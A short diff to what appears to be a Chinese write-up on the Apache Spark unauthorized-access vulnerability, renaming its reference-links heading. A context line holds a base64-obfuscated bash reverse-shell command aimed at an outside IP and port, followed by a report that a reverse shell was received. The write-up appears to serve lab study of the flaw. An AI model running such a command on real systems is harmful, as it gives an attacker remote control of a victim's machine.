@@ -83,7 +83,7 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGxxxxxxxxxxxxEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{bas
 再次执行后成功接收到反弹shell  
 ![image](./pic/1.png)  
 
-# 参考链接：  
+# 0x04 参考链接：  
 https://www.cnblogs.com/mutudou/p/14685277.html  
 https://medium.com/@Wh0ale/apache-spark-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-ada9eb02af65  
 https://github.com/vulhub/vulhub/tree/master/spark/unacc  
